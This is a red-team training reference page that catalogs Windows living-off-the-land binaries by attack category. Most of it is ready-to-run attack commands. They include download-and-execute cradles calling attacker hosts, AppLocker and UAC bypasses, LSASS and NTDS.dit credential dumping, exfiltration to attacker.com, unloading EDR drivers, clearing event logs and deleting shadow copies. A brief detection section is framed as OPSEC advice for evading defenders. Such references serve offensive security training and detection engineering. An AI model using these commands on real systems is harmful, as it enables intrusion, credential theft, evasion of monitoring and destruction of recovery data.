---
layout: training-page
title: "LOLBAS Full Reference — Red Team Academy"
module: "Evasion"
tags:
  - lolbas
  - lolbins
  - living-off-the-land
  - applocker-bypass
  - uac-bypass
  - credential-dump
page_key: "evasion-lolbas-reference"
render_with_liquid: false
---

# LOLBAS Full Reference

## Overview

The **LOLBAS project** (Living Off the Land Binaries, Scripts and Libraries) catalogs Windows binaries that ship with the OS or common Microsoft software and can be abused for offensive purposes. Because these binaries are Microsoft-signed, they bypass application whitelisting, evade hash-based AV detection, and blend into normal administrative activity.

This page organizes the LOLBAS catalog by attack category. For each category the key binaries, their abuse technique, MITRE ATT&CK mapping, and required privilege level are documented. See [LOLBins & LOLBAS](/evasion/lolbins/) for technique-focused usage examples.

![LOLBAS attack category map](/images/evasion/lolbins-map.svg)  
*// lolbas — attack categories by technique*

## Quick-Reference by Category

| Category | Count | Key Binaries | MITRE Tactic |
| --- | --- | --- | --- |
| Execute / AWL Bypass | 248+ | regsvr32, mshta, msbuild, cmstp, odbcconf, wmic, installutil | Defense Evasion (T1218) |
| Download | 60+ | certutil, bitsadmin, mpcmdrun, desktopimgdownldr, finger, winget | Ingress Tool Transfer (T1105) |
| ADS | 36+ | certutil, findstr, esentutl, bitsadmin, tar, mavinject, mshta | Hide Artifacts (T1564.004) |
| UAC Bypass | 9+ | eventvwr, fodhelper, wsreset, computerdefaults, cmstp, iscsicpl | Abuse Elevation Control (T1548.002) |
| Credential Dump | 21+ | reg, comsvcs.dll, ntdsutil, diskshadow, wbadmin, adplus, dump64 | Credential Access (T1003) |
| Compile | 8+ | csc, vbc, jsc, ilasm | Trusted Developer Utilities (T1127) |
| Tamper / Cover Tracks | 5+ | fsutil, fltmc, cipher | Indicator Removal (T1485/T1562) |
| Reconnaissance | 4+ | pktmon, nmcap | Network Sniffing (T1040) |
| Upload / Exfil | 5+ | certreq, datasvUtil, cmd (WebDAV) | Exfiltration (T1048) |
| Credentials (GPP) | 5+ | findstr, reg, cmdkey, rpcping | Unsecured Credentials (T1552) |

## Execute / AppLocker Bypass

These binaries execute arbitrary code while bypassing application whitelisting controls. Default AppLocker policies allow execution from `%WINDIR%` and `%ProgramFiles%`, which most of these binaries reside in.

### regsvr32.exe — Squiblydoo (T1218.010)

Registers/unregisters COM DLLs. The `/i` flag accepts a URL to a scriptlet (`.sct`) served by `scrobj.dll`, enabling remote code execution with no file written to disk.

```
# Remote scriptlet — network call downloads and executes JScript/VBScript:
regsvr32.exe /s /n /u /i:http://10.10.14.5/shell.sct scrobj.dll
# /s: silent  /n: no DllRegisterServer  /u: unregister  /i: INF/URL

# Local .sct file:
regsvr32.exe /s /u /i:C:\Windows\Temp\shell.sct scrobj.dll

# .sct scriptlet template (XML):
# <?XML version="1.0"?>
# <scriptlet><registration progid="SP" classid="{F0001111-0000-0000-0000-0000FEEDACDC}">
#   <script language="JScript">
#     <![CDATA[ var r = new ActiveXObject("WScript.Shell");
#     r.Run("powershell -nop -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/s.ps1')");
#     ]]></script>
# </registration></scriptlet>
# MITRE: T1218.010 | Privilege: User
```

### mshta.exe — HTA Execution (T1218.005)

Executes HTML Applications (.hta). Supports VBScript and JScript inline, can load remote HTA files. Commonly used as an initial dropper in phishing.

```
# Execute local HTA:
mshta.exe C:\Windows\Temp\shell.hta

# Execute remote HTA (network download + execute, no file saved):
mshta.exe http://10.10.14.5/shell.hta

# Inline VBScript — no file at all:
mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""powershell -nop -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/s.ps1')"",0,True)(window.close)")

# Execute from Alternate Data Stream:
mshta.exe "C:\Windows\Temp\file.txt:file.hta"

# MITRE: T1218.005 | Privilege: User
```

### msbuild.exe — Inline C# / XML Build (T1127.001)

Microsoft Build Engine compiles and executes code from XML project files. The code is embedded in the XML — no separate compiler needed. Resides in `%WINDIR%\Microsoft.NET\Framework64\` so it passes default AppLocker policies.

```
# Execute from project file:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj

# Execute via logger DLL (loads arbitrary DLL):
MSBuild.exe /logger:TargetLogger,C:\temp\evil.dll;MyParameters,Foo

# Execute from response file (bypasses command-line detections on "msbuild"):
MSBuild.exe @payload.rsp

# Project file template (payload.csproj):
# <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
#   <Target Name="Run"><ClassEx /></Target>
#   <UsingTask TaskName="ClassEx" TaskFactory="CodeTaskFactory"
#     AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
#     <Task><Code Type="Class" Language="cs"><![CDATA[
#       public class ClassEx : Microsoft.Build.Utilities.Task {
#         public override bool Execute() {
#           System.Diagnostics.Process.Start("powershell.exe", "-nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/stage2.ps1')");
#           return true; } }
#     ]]></Code></Task></UsingTask></Project>
# MITRE: T1127.001 | Privilege: User
```

### cmstp.exe — Connection Manager Profile (T1218.003)

Installs Connection Manager service profiles from `.inf` files. The `UnRegisterOCXSection` in an INF can execute a `.sct` scriptlet via `scrobj.dll`. Also abused for UAC bypass.

```
# Execute code from local INF:
cmstp.exe /ni /s payload.inf

# Execute code from remote INF (bypasses AppLocker):
cmstp.exe /ni /s http://10.10.14.5/payload.inf

# UAC bypass: COM object triggers high-integrity process
# (requires specially crafted INF + registry entries)

# INF template (UnRegisterOCXSection runs .sct):
# [version]
# Signature=$chicago$
# AdvancedINF=2.5
# [DefaultInstall_SingleUser]
# UnRegisterOCXs=DllUnregister
# [DllUnregister]
# scrobj.dll,NI,http://10.10.14.5/shell.sct
# MITRE: T1218.003 | Privilege: User
```

### odbcconf.exe — ODBC Config DLL Loader (T1218.008)

Configures ODBC drivers. The `REGSVR` action loads an arbitrary DLL and calls `DllRegisterServer` — effectively the same as `regsvr32 /s` but with a different binary name.

```
# Load DLL via REGSVR action:
odbcconf.exe /a {REGSVR C:\temp\evil.dll}

# Alternative syntax from response file:
odbcconf.exe /f payload.rsp
# payload.rsp content:
# REGSVR C:\temp\evil.dll

# Install driver and load DLL:
odbcconf.exe INSTALLDRIVER "MyDriver|Driver=C:\temp\evil.dll|APILevel=2"
odbcconf.exe configsysdsn "MyDriver" "DSN=MyDriver"
# MITRE: T1218.008 | Privilege: User
```

### mavinject.exe — DLL Injection via Signed Binary (T1218.013)

Microsoft App-V Injection utility. Injects a DLL into a running process by PID. Useful for injecting into a trusted process to blend network callbacks or evade memory scanning.

```
# Inject DLL into process with PID 4172:
MavInject.exe 4172 /INJECTRUNNING C:\temp\evil.dll

# Inject from Alternate Data Stream:
MavInject.exe 4172 /INJECTRUNNING C:\Windows\Temp\file.txt:evil.dll

# Find injectable PID (pick a stable, accessible process):
tasklist | findstr /i "notepad explorer"
# MITRE: T1218.013 | Privilege: User
```

### wmic.exe — WMI Execution (T1218)

Windows Management Instrumentation CLI. Executes processes locally and remotely. XSL transform support enables JScript/VBScript execution via `/FORMAT`.

```
# Local process creation:
wmic.exe process call create "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/stage2.ps1')"

# Remote process creation (lateral movement):
wmic.exe /node:"192.168.1.10" /user:CORP\admin /password:Password123! process call create "cmd.exe /c whoami > C:\out.txt"

# XSL transform — JScript in .xsl runs via format parsing:
wmic.exe os get /FORMAT:"http://10.10.14.5/shell.xsl"
wmic.exe os get /FORMAT:"\\\\attacker\\share\\shell.xsl"

# Execute from ADS:
wmic.exe process call create "C:\Windows\Temp\file.txt:program.exe"
# MITRE: T1218 | Privilege: User / Admin for remote
```

### pubprn.vbs — Signed Script Proxy Execution (T1216)

pubprn.vbs is a Microsoft-signed VBScript in System32 that can load and execute a remote scriptlet file. Because it is a signed script, it bypasses application whitelisting controls that trust Microsoft-signed content.

```
# Step 1: Host a scriptlet file on your server (proxy.sct):
# <?XML version="1.0"?>
# <scriptlet>
# <registration progid="Bandit" version="1.00" classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"></registration>
# <script language="JScript"><![CDATA[
#   var r = new ActiveXObject("WScript.Shell").Run("powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/s.ps1')");
# ]]></script>
# </scriptlet>

# Step 2: Execute via pubprn.vbs:
cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:http://10.10.14.5/proxy.sct
# /b = batch mode (no user prompts)
# 127.0.0.1 = printer server arg (ignored, any value works)

# Observations:
# - calc.exe/payload spawned by cscript.exe which closes immediately (orphan process)
# - Detection: cscript.exe with "script:" URL in args, network connection to remote host
# MITRE: T1216 | Privilege: User
```

### PowerShell Without powershell.exe (T1059.001)

When powershell.exe is blocked by application whitelisting or monitored, PowerShell can still be executed by hosting the System.Management.Automation.dll in other processes.

```
# Method 1: PowerShdll — rundll32 loads PowerShell DLL
# github.com/p3nt4/PowerShdll
rundll32.exe PowerShdll.dll,main
# Or: regsvr32.exe /s PowerShdll.dll
# Or: regasm.exe /U PowerShdll.dll
# PowerShdll.exe (compiled binary — more detectable, may hit AWL)

# Method 2: SyncAppvPublishingServer.vbs — inject PowerShell commands
# Windows 10 built-in signed VBScript:
SyncAppvPublishingServer.vbs "Break; iwr http://10.10.14.5/s.ps1 | iex"
SyncAppvPublishingServer.vbs "n; Start-Process calc.exe"

# Method 3: Inline C# in MSBuild (System.Management.Automation reference)
# See msbuild.exe section above — invoke Powershell via RunspaceFactory

# Method 4: Custom .NET executable or PowerShell runner
# Compile a .NET binary that references System.Management.Automation.dll
# and calls RunspaceFactory.CreateRunspace()
# MITRE: T1059.001 | Privilege: User
```

### InstallUtil.exe — Bypass AppWhitelisting (T1218.004)

```
# .NET utility that can load and run custom code from a DLL or EXE
# Signed by Microsoft — bypasses application whitelisting

# Step 1: Create C# class with [RunInstaller(true)] attribute:
# public class ShellExec : System.Configuration.Install.Installer {
#     public override void Uninstall(IDictionary savedState) {
#         System.Diagnostics.Process.Start("calc.exe");
#     }
# }

# Step 2: Compile:
# csc /target:library shellexec.cs -o: shellexec.dll
# csc shellexec.cs -o: shellexec.exe

# Step 3: Execute via InstallUtil with /U (uninstall) flag:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U shellexec.dll
# Note: /U triggers Uninstall() method, bypassing code signing checks

# Fileless variant (host on WebDAV):
InstallUtil.exe /logfile= /LogToConsole=false /U \\10.10.14.5\share\shellexec.dll
# MITRE: T1218.004 | Privilege: User
```

### Other Notable Execute Binaries

```
# ssh.exe — execute local or remote command (built-in since Win10 1809):
ssh.exe localhost "whoami /all"
ssh.exe -o ProxyCommand="calc.exe" .

# forfiles.exe — execute per matched file (common execution proxy):
forfiles /p C:\Windows\System32 /m notepad.exe /c "powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/stage2.ps1')"

# pcalua.exe — Program Compatibility Assistant:
pcalua.exe -a C:\temp\evil.exe
pcalua.exe -a \\attacker\share\evil.dll -c

# runscripthelper.exe — run VBScript/JScript:
runscripthelper.exe surfacecheck VerifyNetworkingIsReady C:\Windows\Temp

# syncappvpublishingserver.exe — executes PowerShell commands:
SyncAppvPublishingServer.exe "n; Start-Process calc.exe"

# hh.exe — HTML Help Executable, runs CHM files with embedded scripts:
hh.exe http://10.10.14.5/shell.chm
hh.exe C:\temp\evil.chm

# dnscmd.exe — DnsAdmins privilege escalation (inject DLL into DNS service):
dnscmd.exe dc1.corp.local /config /serverlevelplugindll \\attacker\share\evil.dll
# Requires DnsAdmins group membership; DLL loads as SYSTEM into dns.exe
# T1543.003 | Privilege: DnsAdmins
```

## Download / Ingress Tool Transfer (T1105)

Download files from the internet using trusted OS binaries when PowerShell, curl, or wget are blocked or monitored.

```
# certutil.exe — download + cache bypass:
certutil.exe -urlcache -split -f http://10.10.14.5/nc64.exe nc64.exe
certutil.exe -verifyctl -f http://10.10.14.5/nc64.exe nc64.exe

# bitsadmin.exe — Background Intelligent Transfer:
bitsadmin.exe /create job
bitsadmin.exe /addfile job http://10.10.14.5/shell.exe C:\Windows\Temp\shell.exe
bitsadmin.exe /resume job

# MpCmdRun.exe — Windows Defender CLI (downloads via user-agent "MpCommunication"):
MpCmdRun.exe -DownloadFile -url http://10.10.14.5/shell.exe -path C:\Windows\Temp\shell.exe
# Bypass Win10 mitigation (copy binary first):
copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" C:\Users\Public\MP.exe
cd "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\"
C:\Users\Public\MP.exe -DownloadFile -url http://10.10.14.5/shell.exe -path C:\Users\Public\shell.exe

# desktopimgdownldr.exe — downloads wallpaper images:
set SYSTEMROOT=C:\Windows\Temp
desktopimgdownldr.exe /lockscreenurl:http://10.10.14.5/shell.exe /eventName:desktopimgdownldr
# Check %LOCALAPPDATA%\Temp\

# finger.exe — Finger protocol client (unusual outbound, bypasses many filters):
finger user@attacker.com | more +2 | cmd
# Attacker's finger daemon returns a payload in the response text

# winget.exe — Windows Package Manager (Win10+):
winget.exe install --manifest payload.yml --accept-package-agreements
# payload.yml specifies download URL + installer path
# Also downloads from MS Store (useful to get Sysinternals past controls):
winget.exe install --accept-package-agreements -s msstore "Sysinternals Suite"

# expand.exe — Cabinet file expand:
expand.exe http://10.10.14.5/shell.cab C:\Windows\Temp\shell.exe

# certreq.exe — Certificate Request (also downloads):
certreq.exe -Post -config http://10.10.14.5/ C:\Windows\System32\calc.exe output.txt

# AppInstaller.exe — ms-appinstaller URI handler:
start ms-appinstaller://?source=http://10.10.14.5/payload.appinstaller

# curl.exe (Win10 1803+) / wget via PowerShell alias:
curl.exe -o C:\Windows\Temp\shell.exe http://10.10.14.5/shell.exe
```

## Alternate Data Streams (ADS) — T1564.004

NTFS Alternate Data Streams hide data in a named stream of an existing file. The host file appears unchanged; directory listings don't show the stream. Content stored in ADS can be executed directly or extracted.

```
# certutil.exe — download directly to ADS:
certutil.exe -urlcache -f http://10.10.14.5/shell.ps1 C:\Windows\Temp\legit.txt:shell.ps1

# MpCmdRun.exe — download to ADS:
MpCmdRun.exe -DownloadFile -url http://10.10.14.5/shell.exe -path C:\Windows\Temp\file.txt:evil.exe

# bitsadmin.exe — execute from ADS:
bitsadmin /create 1
bitsadmin /addfile 1 C:\Windows\System32\cmd.exe C:\Temp\cmd.exe
bitsadmin /SetNotifyCmdLine 1 "C:\Windows\Temp\file.txt:program.exe" ""
bitsadmin /RESUME 1

# findstr.exe — write file to ADS (XOR trick — string not found so entire file copies):
findstr /V /L W3AllLov3LolBas C:\Windows\System32\cmd.exe > C:\Temp\legit.txt:cmd.exe

# esentutl.exe — copy file to/from ADS:
esentutl.exe /y C:\temp\shell.exe /d C:\Temp\legit.txt:shell.exe /o   # write to ADS
esentutl.exe /y C:\Temp\legit.txt:shell.exe /d C:\temp\shell.exe /o   # extract from ADS

# tar.exe — compress to ADS:
tar.exe -cf C:\Temp\legit.txt:archive.tar C:\Temp\tools\

# mavinject.exe — inject DLL from ADS into process:
MavInject.exe 4172 /INJECTRUNNING C:\Windows\Temp\file.txt:evil.dll

# mshta.exe — execute HTA from ADS:
mshta.exe "C:\Windows\Temp\legit.txt:shell.hta"

# wmic.exe — execute binary from ADS:
wmic.exe process call create "C:\Windows\Temp\legit.txt:program.exe"

# List ADS on a file:
dir /r C:\Windows\Temp\legit.txt
Get-Item C:\Windows\Temp\legit.txt -Stream *
```

## UAC Bypass (T1548.002)

These techniques launch processes at high integrity (bypassing UAC) without triggering a UAC prompt. Most require that the current user is in the local Administrators group and that UAC is not set to "Always Notify".

```
# eventvwr.exe — registry hijack via HKCU\Software\Classes\mscfile\shell\open\command
# Plant command before launching eventvwr:
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "C:\temp\shell.exe" /f
eventvwr.exe
# eventvwr queries HKCU registry first, spawns shell.exe at high integrity

# wsreset.exe — hijack HKCU\Software\Classes\AppX...\shell\open\command:
reg add "HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command" /d "C:\temp\shell.exe" /f
reg add "HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command" /v "DelegateExecute" /f
wsreset.exe

# computerdefaults.exe — hijack HKCU\Software\Classes\ms-settings\shell\open\command:
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "C:\temp\shell.exe" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /f
ComputerDefaults.exe

# iscsicpl.exe — DLL planting (C:\Windows\SysWOW64\iscsicpl.exe loads iscsidsc.dll):
copy evil.dll C:\Windows\SysWOW64\iscsidsc.dll
c:\windows\syswow64\iscsicpl.exe

# cmstp.exe — auto-elevate + COM scriptlet execution:
# (see Execute section — combine with UAC bypass via COM object)

# iscsicpl.exe — execute arbitrary binary via DLL hijack:
# Drops to high integrity via auto-elevate, loads planted iscsidsc.dll
# T1548.002 | Privilege: User (must be in Administrators group)
```

## Credential Dumping (T1003)

Native Windows binaries that can dump credentials, extract the AD database, or capture authentication material without dropping third-party tools.

### LSASS Dump via Signed Binaries

```
# comsvcs.dll MiniDump — most common lolbin LSASS dump:
# Get LSASS PID first:
tasklist | findstr /i lsass
# or via PowerShell: (Get-Process lsass).Id

# Dump via rundll32 + comsvcs.dll:
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 632 C:\Windows\Temp\lsass.dmp full

# rdrleakdiag.exe — Resource Leak Diagnostic (full memory dump):
rdrleakdiag.exe /p 632 /o C:\Windows\Temp\ /fullmemdmp /wait 1

# Dump64.exe — Visual Studio debugger dump utility:
dump64.exe 632 C:\Windows\Temp\lsass.dmp

# DumpMinitool.exe — .NET memory dump tool:
DumpMinitool.exe --file C:\Windows\Temp\lsass.dmp --processId 632 --dumpType Full

# Sqldumper.exe — SQL Server dump utility:
sqldumper.exe 632 0 0x01100:40

# TTTracer.exe — Time Travel Debugging (requires kernel driver):
TTTracer.exe -dumpFull -attach 632

# adplus.exe — WinDBG automation (requires WinDBG install):
adplus.exe -hang -pn lsass.exe -o C:\Windows\Temp\ -quiet

# Createdump.exe — .NET runtime helper:
createdump.exe -n -f C:\Windows\Temp\lsass.dmp 632

# Parse dump offline with Mimikatz (on attack box):
mimikatz# sekurlsa::minidump lsass.dmp
mimikatz# sekurlsa::logonpasswords
```

### NTDS.dit Extraction (T1003.003)

Extract the Active Directory database from Domain Controllers. All methods require Domain Admin or Backup Operator / SeBackupPrivilege.

```
# ntdsutil.exe — official AD management tool:
ntdsutil.exe "ac i ntds" "ifm" "create full C:\Windows\Temp\dump" q q
# Creates snapshot and exports ntds.dit + SYSTEM hive to dump folder

# diskshadow.exe — VSS-based extraction:
# Create a diskshadow script file (shadow.txt):
# set context persistent nowriters
# add volume c: alias myalias
# create
# expose %myalias% z:
# exec cmd.exe /c copy z:\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit
# exec cmd.exe /c copy z:\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM
# delete shadows all
# reset
diskshadow.exe /s C:\Windows\Temp\shadow.txt

# wbadmin.exe — Windows Backup (SeBackupPrivilege):
wbadmin start backup -backupTarget:C:\Windows\Temp\bak -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet
# Recover from backup:
wbadmin get versions
wbadmin start recovery -version:04/03/2026-10:00 -recoverytarget:C:\Windows\Temp\recover -itemtype:file -items:C:\Windows\NTDS\NTDS.dit -notRestoreAcl -quiet

# dsdbutil.exe — NTDS snapshot management (Server 2008+):
dsdbutil.exe "activate instance ntds" "snapshot" "create" "list all" "mount 1" "quit" "quit"
# Then copy ntds.dit from mounted snapshot volume:
copy C:\$SNAP_TIMESTAMP_VOLUMEC$\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit
# Cleanup:
dsdbutil.exe "activate instance ntds" "snapshot" "list all" "delete 1" "quit" "quit"

# Decrypt ntds.dit offline (requires matching SYSTEM hive):
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

### Registry-Based Credential Extraction

```
# reg.exe — export SAM, SECURITY, SYSTEM hives:
reg save HKLM\SAM C:\Windows\Temp\sam.bak
reg save HKLM\SECURITY C:\Windows\Temp\security.bak
reg save HKLM\SYSTEM C:\Windows\Temp\system.bak
# Parse offline:
impacket-secretsdump -sam sam.bak -security security.bak -system system.bak LOCAL

# cmdkey.exe — list stored credentials:
cmdkey /list
# Shows credentials stored in Windows Credential Manager

# findstr.exe — search SYSVOL for Group Policy Preference passwords (MS14-025):
findstr /S /I cpassword \\DC01\SYSVOL\corp.local\Policies\*.xml
# Decrypt with gpp-decrypt (Kali): gpp-decrypt "EncryptedPassword"

# rpcping.exe — capture NTLM hash via RPC:
rpcping.exe -s 10.10.14.5 -e 1234 -a privacy -u NTLM
# Capture with Responder on the attack box
# T1187 — Forced Authentication
```

## On-System Compile (T1127)

Compile attacker code directly on the target using Microsoft-signed compilers. No payload binary needs to be transferred; just source code or IL assembly.

```
# csc.exe — C# compiler (.NET Framework):
# Compile to EXE:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:shell.exe payload.cs

# Compile to DLL:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:library -out:shell.dll payload.cs

# vbc.exe — Visual Basic compiler:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\vbc.exe /target:exe payload.vb
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\vbc.exe -reference:Microsoft.VisualBasic.dll payload.vb

# jsc.exe — JScript compiler (Windows Script Components):
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\jsc.exe payload.js
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\jsc.exe /t:library payload.js

# ilasm.exe — IL Assembler (compile MSIL directly):
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ilasm.exe payload.il /exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ilasm.exe payload.il /dll

# Workflow:
# 1. Drop minimal source code (smaller, easier to smuggle)
# 2. Compile on target — no binary ever transferred
# 3. Execute compiled output
# All compilers in %WINDIR%\Microsoft.NET\Framework64\v4.0.30319\
```

## Tamper / Indicator Removal (T1485, T1562)

Erase forensic artifacts, disable monitoring, or impair defenses using native binaries.

```
# fsutil.exe — zero-fill a file (forensic wipe without deletion):
fsutil.exe file setZeroData offset=0 length=9999999999 C:\Windows\Temp\payload.exe
# File stays on disk but contains only null bytes — unrecoverable

# fsutil.exe — delete USN journal (hides file creation events):
fsutil.exe usn deletejournal /d C:
# USN journal records file creates/modifies; deleting it prevents forensic timeline reconstruction

# fltMC.exe — unload minifilter driver (disables EDR kernel component):
fltMC.exe unload SysmonDrv      # unloads Sysmon
fltMC.exe unload CrowdStrike    # attempt to unload CS sensor driver
# Requires Admin; driver may re-register — useful for temporary blind spot
# List loaded filters: fltMC.exe

# cipher.exe — securely overwrite free space / specific files:
cipher.exe /w:C:\Windows\Temp\    # overwrite free space in directory
cipher.exe /e C:\Windows\Temp\payload.exe   # encrypt (impair EDR access to file)

# wevtutil.exe — clear event logs:
wevtutil.exe cl System
wevtutil.exe cl Security
wevtutil.exe cl Application
# Clear specific provider:
wevtutil.exe cl "Microsoft-Windows-PowerShell/Operational"

# vssadmin.exe — delete shadow copies (ransomware technique, also destroys recovery):
vssadmin.exe delete shadows /all /quiet
```

## Network Reconnaissance via Built-in Tools (T1040)

```
# pktmon.exe — built-in packet capture (Win10 1809+, requires Admin):
pktmon.exe filter add -p 445       # capture only SMB
pktmon.exe filter add -p 80        # capture HTTP
pktmon.exe start --etw             # start capture → PktMon.etl
pktmon.exe stop
pktmon.exe etl2txt PktMon.etl      # convert to readable text

# nmcap.exe — Network Monitor capture (requires Network Monitor install):
nmcap.exe /network * /capture "port 445" /file capture.cap

# netsh.exe — capture via helper (Win7+):
netsh.exe trace start capture=yes tracefile=C:\Windows\Temp\net.etl
netsh.exe trace stop

# Convert ETL to PCAP for Wireshark:
# (Use Microsoft Message Analyzer or etl2pcapng tool)
```

## Upload / Exfiltration (T1048)

```
# certreq.exe — POST file to attacker server:
certreq.exe -Post -config http://10.10.14.5/collect C:\Windows\Temp\data.txt output.txt
# Attacker receives file as HTTP POST body

# cmd.exe — copy to WebDAV share (no extra tools):
type C:\Windows\Temp\secrets.txt > \\attacker.com@80\DavShare\secrets.txt
net use \\attacker.com@80\DavShare /user:guest ""
copy C:\Windows\Temp\secrets.txt \\attacker.com@80\DavShare\

# DataSvcUtil.exe — WCF Data Services upload:
DataSvcUtil.exe /out:C:\Windows\Temp\data.txt /uri:http://10.10.14.5/receive

# dns exfil via TestWindowRemoteAgent.exe:
# Base64-encode data and send in DNS subdomain queries:
TestWindowRemoteAgent.exe start -h {base64data}.attacker.com -p 8000

# Indirect upload via Alternate Data Stream + sync service (OneDrive, Dropbox):
# Write to ADS of a synced file — sync service uploads the stream alongside main file
```

## Notable OtherMSBinaries

Binaries from non-OS Microsoft products (Visual Studio, SQL Server, Office) that are commonly found on enterprise systems.

```
# bginfo.exe — Sysinternals BGInfo (common on enterprise desktops):
# Execute local VBScript:
bginfo.exe payload.bgi /timer:0 /silent /nolicprompt
# Execute remote VBScript via .bgi config:
bginfo.exe \\attacker\share\payload.bgi /timer:0 /silent /nolicprompt
# T1218 | Privilege: User

# cdb.exe — Windows Debugger (WinDBG Console Debugger):
cdb.exe -cf payload.wds -o notepad.exe    # run WinDBG script then attach to notepad
cdb.exe -pd -c "q" notepad.exe           # create process via debugger
# T1218 | Privilege: User

# adplus.exe — automated WinDBG script runner:
adplus.exe -c payload.xml    # execute XML-scripted debugger commands
# T1003.001 / T1218 | Privilege: SYSTEM

# wsl.exe — Windows Subsystem for Linux (if installed):
wsl.exe curl http://10.10.14.5/shell.elf -o /tmp/shell
wsl.exe chmod +x /tmp/shell && /tmp/shell
# Runs Linux binary directly; bypasses Windows AV
# T1202 | Privilege: User

# dotnet.exe — .NET CLI:
dotnet.exe script payload.csx    # execute C# script file
dotnet.exe run --project malicious_project
# T1218 | Privilege: User

# winget.exe — install arbitrary packages:
winget.exe install --manifest payload.yml    # execute installer from custom manifest
winget.exe install --accept-package-agreements -s msstore "Windows Terminal"
# T1105 | Privilege: Local Administrator (for manifest)
```

## Detection & Defense

Understanding how defenders detect LOLBin abuse helps red teamers anticipate monitoring and refine techniques.

```
# Key detection sources:
# - Windows Event Log 4688 (Process Creation with command line, requires audit policy)
# - Sysmon Event ID 1 (Process Create) + Event ID 7 (Image Load)
# - EDR telemetry: parent-child process anomalies, unsigned DLL loads
# - Network: unusual outbound from signed binaries (certutil, mshta, bitsadmin)

# Common Sigma rule coverage:
# proc_creation_win_certutil_download.yml
# proc_creation_win_regsvr32_network_activity.yml
# proc_creation_win_mshta_*.yml
# proc_creation_win_msbuild_*.yml
# proc_creation_win_lolbin_*.yml

# Defender mitigations:
# - AppLocker: publisher rules on certutil, msbuild (block by publisher if not needed)
# - Windows Defender Attack Surface Reduction (ASR) rules:
#   Block process creations from mshta, wscript, cscript, msiexec
#   Block credential stealing from LSASS
# - Constrained Language Mode (PowerShell)
# - Restrict WMIC, BITSAdmin via AppLocker/WDAC

# Red Team OPSEC:
# - Use -urlcache flag minimizes certutil log artifacts
# - Prefer HTTPS targets (avoid HTTP cleartext in ETL)
# - Sleep between LOLBin executions (reduce event correlation window)
# - Clear %LOCALAPPDATA%\Temp\MpCmdRun.log after MpCmdRun use
```

## LOLBAS Project Resources

- **LOLBAS Project Website:** lolbas-project.github.io — searchable catalog with all entries
- **GTFOBins** — Linux equivalent: gtfobins.github.io
- **WADComs** — Active Directory living-off-the-land: wadcoms.github.io
- **MITRE ATT&CK T1218** — Signed Binary Proxy Execution technique family
- **Sigma Rules** — github.com/SigmaHQ/sigma — detection rules for most LOLBins
